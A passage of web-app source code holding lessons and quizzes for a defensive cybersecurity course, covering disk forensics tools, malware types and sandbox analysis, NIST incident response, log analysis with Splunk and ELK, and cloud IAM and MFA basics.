                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Purpose</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Command Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">PhotoRec</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">File carving and recovery</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">photorec /dev/sdb</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">TestDisk</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Partition recovery</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">testdisk /dev/sda</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Autopsy</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Full forensic analysis</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">GUI-based analysis</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Part 5: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the purpose of creating a forensic image?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) To modify evidence</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) To create an exact copy for investigation</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) To delete system files</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between logical and physical disk imaging.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How does Volatility help in memory forensics?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Create a forensic image using FTK Imager and analyze it with Autopsy.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 3: Malware Analysis',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand different types of malware and their behaviors.</li>
                                <li>Learn about static and dynamic malware analysis techniques.</li>
                                <li>Use sandbox environments to analyze malware safely.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Types of Malware (RATs, Trojans, Ransomware)',
                        content: `
                            <h4 class="font-bold">Common Malware Categories</h4>
                            <ol class="pl-6 mb-6">
                                <li class="mb-4">
                                    <strong>Remote Access Trojans (RATs)</strong>
                                    <ul class="pl-6 mt-2">
                                        <li>Allow attackers full control over an infected system.</li>
                                        <li>Can capture keystrokes, webcam feeds, and files.</li>
                                        <li>Example: DarkComet, NjRat</li>
                                    </ul>
                                </li>
                                <li class="mb-4">
                                    <strong>Trojans</strong>
                                    <ul class="pl-6 mt-2">
                                        <li>Disguised as legitimate software but contain malicious code.</li>
                                        <li>Used for stealing data or creating backdoors.</li>
                                        <li>Example: Zeus Trojan</li>
                                    </ul>
                                </li>
                                <li class="mb-4">
                                    <strong>Ransomware</strong>
                                    <ul class="pl-6 mt-2">
                                        <li>Encrypts files and demands ransom payment.</li>
                                        <li>Example: WannaCry, Locky</li>
                                    </ul>
                                </li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Research and document a real-world ransomware attack and its impact.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Static vs. Dynamic Malware Analysis',
                        content: `
                            <h4 class="font-bold">Static Analysis</h4>
                            <ul class="pl-6 mb-6">
                                <li>Examining the binary file without executing it.</li>
                                <li>Identifies file structure, embedded strings, and signatures.</li>
                                <li>Tools Used:
                                    <ul class="pl-6 mt-2">
                                        <li>Strings – Extract readable text from binaries.</li>
                                        <li>VirusTotal – Online malware scanning.</li>
                                        <li>IDA Pro, Ghidra – Disassemblers for reverse engineering.</li>
                                    </ul>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Dynamic Analysis</h4>
                            <ul class="pl-6 mb-6">
                                <li>Running the malware in an isolated environment to observe behavior.</li>
                                <li>Captures network requests, file modifications, registry changes.</li>
                                <li>Tools Used:
                                    <ul class="pl-6 mt-2">
                                        <li>Process Monitor (ProcMon) – Monitors file and registry changes.</li>
                                        <li>Wireshark – Captures network traffic.</li>
                                        <li>Regshot – Compares registry states before and after execution.</li>
                                    </ul>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use Strings and VirusTotal to analyze a sample malware executable.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Sandbox Environments (Any.Run, Cuckoo Sandbox)',
                        content: `
                            <h4 class="font-bold">Why Use Sandboxes?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Provides a safe environment to execute and analyze malware.</li>
                                <li>Records system interactions without harming the host system.</li>
                            </ul>
                    
                            <h4 class="font-bold">Popular Malware Sandboxes</h4>
                            <ol class="pl-6 mb-6">
                                <li class="mb-4">
                                    <strong>Any.Run</strong> – Cloud-based malware analysis with an interactive interface.
                                    <ul class="pl-6 mt-2">
                                        <li>URL: https://any.run</li>
                                    </ul>
                                </li>
                                <li class="mb-4">
                                    <strong>Cuckoo Sandbox</strong> – Open-source automated malware analysis.
                                    <ul class="pl-6 mt-2">
                                        <li>Supports custom VMs for in-depth analysis.</li>
                                        <li>Detects persistence mechanisms, API calls, and network activity.</li>
                                    </ul>
                                </li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Upload a suspicious file to Any.Run and analyze its behavior.</li>
                                <li>Set up Cuckoo Sandbox on a virtual machine and analyze a sample malware.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which type of malware encrypts files and demands payment?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Trojan</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Ransomware</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) RAT</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is the main difference between static and dynamic malware analysis?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is commonly used for disassembling malware binaries?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">How do Remote Access Trojans (RATs) operate?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Why is it important to use sandbox environments for malware analysis?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">Use Wireshark to capture network activity from a running malware sample.</li>
                                <li class="mb-4">Analyze a malware sample in Cuckoo Sandbox and document findings.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 4: Incident Response & Threat Hunting',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand the Incident Handling Process based on the NIST Framework.</li>
                                <li>Learn how to use Threat Intelligence Platforms (MITRE ATT&CK, VirusTotal) for cybersecurity.</li>
                                <li>Utilize ELK Stack and Splunk for real-time log analysis and threat detection.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Incident Handling Process (NIST Framework)', 
                        content: `
                            <h4 class="font-bold">What is Incident Response?</h4>
                            <p class="mb-4">Incident response is the structured approach to handling cybersecurity incidents to minimize damage and recover systems effectively.</p>
                    
                            <h4 class="font-bold">NIST Incident Response Lifecycle</h4>
                            <ol class="pl-6 mb-6">
                                <li class="mb-2">Preparation – Establish policies, tools, and procedures for incident handling.</li>
                                <li class="mb-2">Detection & Analysis – Identify security events and analyze their impact.</li>
                                <li class="mb-2">Containment, Eradication, & Recovery – Isolate affected systems, remove threats, and restore operations.</li>
                                <li class="mb-2">Post-Incident Activity – Document findings and implement lessons learned.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Develop an incident response plan for a simulated security breach.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Threat Intelligence Platforms (MITRE ATT&CK, VirusTotal)',
                        content: `
                            <h4 class="font-bold">What is Threat Intelligence?</h4>
                            <p class="mb-4">Threat Intelligence involves gathering, analyzing, and utilizing data to identify cyber threats before they cause harm.</p>
                    
                            <h4 class="font-bold">Key Threat Intelligence Platforms</h4>
                            <ol class="pl-6 mb-6">
                                <li class="mb-4">
                                    <strong>MITRE ATT&CK</strong>
                                    <ul class="pl-6 mt-2">
                                        <li>A knowledge base of adversary tactics, techniques, and procedures (TTPs).</li>
                                        <li>Helps organizations map attacks and improve security defenses.</li>
                                        <li>URL: https://attack.mitre.org</li>
                                    </ul>
                                </li>
                                <li class="mb-4">
                                    <strong>VirusTotal</strong>
                                    <ul class="pl-6 mt-2">
                                        <li>An online malware scanning service.</li>
                                        <li>Uses multiple antivirus engines to detect malicious files and URLs.</li>
                                        <li>URL: https://www.virustotal.com</li>
                                    </ul>
                                </li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use MITRE ATT&CK to analyze a recent cyber-attack case study.</li>
                                <li>Upload a malware hash to VirusTotal and examine its analysis report.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Using ELK Stack & Splunk for Log Analysis',
                        content: `
                            <h4 class="font-bold">What is Log Analysis?</h4>
                            <p class="mb-4">Log analysis involves collecting and examining system logs to detect unauthorized access, anomalies, and cyber threats.</p>
                    
                            <h4 class="font-bold">Tools for Log Analysis</h4>
                            <ol class="pl-6 mb-6">
                                <li class="mb-4">
                                    <strong>ELK Stack (Elasticsearch, Logstash, Kibana)</strong>
                                    <ul class="pl-6 mt-2">
                                        <li>Elasticsearch – Stores and searches logs efficiently.</li>
                                        <li>Logstash – Collects and processes logs from various sources.</li>
                                        <li>Kibana – Visualizes log data in dashboards.</li>
                                        <li>URL: https://www.elastic.co/elk-stack</li>
                                    </ul>
                                </li>
                                <li class="mb-4">
                                    <strong>Splunk</strong>
                                    <ul class="pl-6 mt-2">
                                        <li>A powerful platform for real-time log monitoring and security analytics.</li>
                                        <li>Uses queries and dashboards to detect security incidents.</li>
                                        <li>URL: https://www.splunk.com</li>
                                    </ul>
                                </li>
                            </ol>
                    
                            <h4 class="font-bold">Common Log Analysis Techniques</h4>
                            <div class="bg-gray-100 p-2 mb-4 rounded">
                                <code>index=security sourcetype=auth_logs "failed login"</code>
                                <br>
                                <code>index=network_logs | stats count by source_ip</code>
                            </div>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Set up an ELK Stack or Splunk environment and create a basic log analysis dashboard.</li>
                                <li>Detect failed SSH login attempts from system logs.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the first step in the NIST Incident Response Framework?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Detection & Analysis</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Containment</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Preparation</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which platform provides a database of attacker techniques and tactics?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Splunk</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) MITRE ATT&CK</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) ELK Stack</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is the primary function of Logstash in the ELK Stack?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">How does VirusTotal help detect malware?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Why is post-incident analysis important in cybersecurity?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use MITRE ATT&CK to investigate a real-world cyber attack.</li>
                                <li>Analyze log files using Splunk or ELK Stack to detect a simulated attack.</li>
                            </ul>
                        `
                    }   
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },
            {
                id: "module-4",
                title: 'Module 4: Cloud Security & DevSecOps',
                icon: Shield,
                sections: [
                    {
                        title: 'Session 1: Introduction to Cloud Security',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand the basics of Cloud Computing (AWS, Azure, GCP).</li>
                                <li>Identify Cloud Security Threats and mitigation strategies.</li>
                                <li>Learn the Shared Responsibility Model in cloud environments.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Cloud Computing Basics (AWS, Azure, GCP)',
                        content: `
                            <h4 class="font-bold">What is Cloud Computing?</h4>
                            <p class="mb-4">Cloud computing is the delivery of computing services (storage, servers, networking, software) over the internet to offer faster innovation, flexible resources, and economies of scale.</p>
                    
                            <h4 class="font-bold">Types of Cloud Computing</h4>
                            <ol class="pl-6 mb-6">
                                <li class="mb-4">
                                    <strong>Infrastructure as a Service (IaaS)</strong> – Provides virtualized computing resources.
                                    <ul class="pl-6 mt-2">
                                        <li>Example: AWS EC2, Azure Virtual Machines, Google Compute Engine.</li>
                                    </ul>
                                </li>
                                <li class="mb-4">
                                    <strong>Platform as a Service (PaaS)</strong> – Provides development environments.
                                    <ul class="pl-6 mt-2">
                                        <li>Example: AWS Lambda, Azure App Service, Google App Engine.</li>
                                    </ul>
                                </li>
                                <li class="mb-4">
                                    <strong>Software as a Service (SaaS)</strong> – Delivers software applications over the internet.
                                    <ul class="pl-6 mt-2">
                                        <li>Example: Google Workspace, Microsoft Office 365.</li>
                                    </ul>
                                </li>
                            </ol>
                    
                            <h4 class="font-bold">Key Cloud Service Providers</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Provider</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">AWS</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Leading cloud provider with a broad range of services.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Azure</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Microsoft's cloud platform, well-integrated with enterprise systems.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">GCP</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Google's cloud services focused on AI/ML and data analytics.</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Create a free-tier account on AWS, Azure, or GCP and explore the console.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Cloud Security Threats',
                        content: `
                            <h4 class="font-bold">Common Cloud Security Threats</h4>
                            <ol class="pl-6 mb-6">
                                <li>Data Breaches – Unauthorized access to cloud-stored data.</li>
                                <li>Misconfiguration – Exposed storage buckets, weak security settings.</li>
                                <li>Insider Threats – Employees misusing access privileges.</li>
                                <li>Denial of Service (DoS) Attacks – Overloading cloud resources.</li>
                                <li>Account Hijacking – Stolen credentials used to access cloud accounts.</li>
                            </ol>
                    
                            <h4 class="font-bold">Cloud Security Best Practices</h4>
                            <ul class="pl-6 mb-6">
                                <li>Enable Multi-Factor Authentication (MFA) for cloud accounts.</li>
                                <li>Use IAM roles and least privilege principles.</li>
                                <li>Encrypt data at rest and in transit.</li>
                                <li>Monitor cloud activity using CloudTrail (AWS), Azure Monitor, or Google Cloud Logging.</li>
                            </ul>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Perform a security assessment of an AWS S3 bucket or Azure Blob Storage using security best practices.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Shared Responsibility Model',
                        content: `
                            <h4 class="font-bold">What is the Shared Responsibility Model?</h4>
                            <p class="mb-4">Cloud security is a shared responsibility between the Cloud Provider and the Customer.</p>
                    
                            <h4 class="font-bold">Responsibility Breakdown</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Responsibility</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Cloud Provider</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Customer</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Infrastructure Security</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">✅</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">❌</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Application Security</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">❌</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">✅</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Data Protection</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">❌</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">✅</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Access Management</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">❌</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">✅</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Review AWS Well-Architected Framework or Azure Security Best Practices to understand cloud security roles.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which of the following is an example of IaaS?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) AWS Lambda</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Google Compute Engine</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Microsoft Office 365</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is a major risk of cloud misconfiguration?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Faster performance</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Data exposure</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Reduced costs</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">In the Shared Responsibility Model, who is responsible for data security?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between SaaS, PaaS, and IaaS.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How can Multi-Factor Authentication (MFA) enhance cloud security?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Configure IAM roles and policies in AWS or Azure for secure access management.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 2: Identity & Access Management (IAM)',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand AWS IAM & Role-Based Access Control (RBAC).</li>
                                <li>Learn how Multi-Factor Authentication (MFA) enhances security.</li>
                                <li>Implement Cloud Security Best Practices for IAM.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: AWS IAM & Role-Based Access Control (RBAC)',
                        content: `
                            <h4 class="font-bold">What is AWS IAM?</h4>
                            <p class="mb-4">AWS Identity and Access Management (IAM) allows organizations to securely manage permissions and access to AWS resources.</p>
                    
                            <h4 class="font-bold">Key IAM Concepts</h4>
                            <ol class="pl-6 mb-6">
                                <li>Users – Individual accounts with specific permissions.</li>
                                <li>Groups – Collection of users with shared permissions.</li>
                                <li>Roles – Temporary permissions for services or external accounts.</li>
                                <li>Policies – JSON-based documents defining access rules.</li>
                            </ol>
                    
                            <h4 class="font-bold">Role-Based Access Control (RBAC)</h4>
                            <p class="mb-4">RBAC is a security model that assigns permissions based on user roles, reducing excessive privileges and following the Principle of Least Privilege (PoLP).</p>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Create an IAM Role in AWS and assign it least privilege permissions.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Multi-Factor Authentication (MFA)',
                        content: `
                            <h4 class="font-bold">Why Use MFA?</h4>
                            <p class="mb-4">MFA adds an extra layer of security by requiring a second authentication factor, such as:</p>
                            <ul class="pl-6 mb-6">
                                <li>SMS Codes (Not recommended for high-security applications).</li>
                                <li>Authenticator Apps (Google Authenticator, Microsoft Authenticator).</li>
                                <li>Hardware Tokens (YubiKey, RSA SecureID).</li>
                            </ul>
                    
                            <h4 class="font-bold">Enabling MFA in AWS</h4>
                            <ol class="pl-6 mb-6">
                                <li>Navigate to AWS IAM Dashboard.</li>
                                <li>Select Users and choose an account.</li>
                                <li>Click Security Credentials → Assign MFA Device.</li>
                                <li>Scan QR code with an Authenticator App.</li>
                                <li>Enter the generated MFA codes to verify setup.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Enable MFA for an AWS IAM user and verify access security.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Cloud Security Best Practices',
                        content: `
                            <h4 class="font-bold">Best Practices for IAM Security</h4>
                            <ol class="pl-6 mb-6">
                                <li>Follow Least Privilege Principle – Grant only necessary permissions.</li>
                                <li>Rotate Access Keys Regularly – Reduce the risk of compromised credentials.</li>
                                <li>Use IAM Roles Instead of Root Accounts – Restrict root account usage.</li>
                                <li>Enable IAM Access Analyzer – Monitor excessive privileges and security risks.</li>
                                <li>Monitor IAM Logs with AWS CloudTrail – Track login attempts and API calls.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Set up AWS CloudTrail to monitor IAM activity and review logs.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the purpose of IAM Roles in AWS?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) To create user accounts</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) To provide temporary access to AWS services</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) To store passwords</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which authentication factor is NOT considered secure?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) SMS-based MFA</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Authenticator App</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Hardware Token</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What does AWS CloudTrail do?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between IAM Users, Groups, and Roles.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How does MFA protect against unauthorized access?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Create an IAM Role with least privilege permissions in AWS.</li>
                                <li>Enable MFA for an IAM user and test the authentication process.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 3: DevSecOps & Secure Coding',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand the Secure Software Development Lifecycle (SDLC).</li>
                                <li>Learn OWASP Secure Coding Guidelines to prevent vulnerabilities.</li>
                                <li>Implement CI/CD Pipeline Security to ensure secure application deployment.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Secure Software Development Lifecycle (SDLC)',
                        content: `
                            <h4 class="font-bold">What is Secure SDLC?</h4>
                            <p class="mb-4">The Secure Software Development Lifecycle (SDLC) integrates security best practices into every phase of software development to reduce vulnerabilities and ensure compliance.</p>
                    
                            <h4 class="font-bold">Phases of Secure SDLC</h4>
                            <ol class="pl-6 mb-6">
                                <li>Planning – Define security requirements and compliance needs.</li>
                                <li>Design – Implement security architecture and threat modeling.</li>
                                <li>Development – Use secure coding practices and code reviews.</li>
                                <li>Testing – Conduct security testing (SAST, DAST, penetration testing).</li>
                                <li>Deployment – Ensure security in infrastructure as code (IaC) and cloud environments.</li>
                                <li>Maintenance & Monitoring – Continuously monitor for threats and apply patches.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Perform threat modeling for a web application and document security risks.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: OWASP Secure Coding Guidelines',
                        content: `
                            <h4 class="font-bold">What is OWASP?</h4>
